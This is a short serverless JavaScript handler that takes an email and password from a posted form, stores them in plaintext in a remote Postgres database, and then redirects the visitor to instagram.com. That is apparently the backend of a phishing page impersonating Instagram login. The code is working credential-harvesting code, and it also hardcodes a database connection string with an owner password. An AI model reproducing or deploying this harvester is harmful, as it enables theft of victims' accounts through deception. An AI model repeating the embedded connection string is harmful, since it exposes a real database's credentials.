const { neon } = require('@neondatabase/serverless');
const sql = neon("postgresql://neondb_owner:npg_3YbZqPAEaNG2@ep-billowing-sea-a7nrltdl-pooler.ap-southeast-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require");

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const querystring = require('querystring');
  const { email, password } = querystring.parse(event.body);

  try {
    await sql`INSERT INTO users (email, password) VALUES (${email}, ${password})`;
    return {
      statusCode: 302,
      headers: {
        Location: "https://www.instagram.com",
      },
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: `❌ Error: ${err.message}`,
    };
  }
};
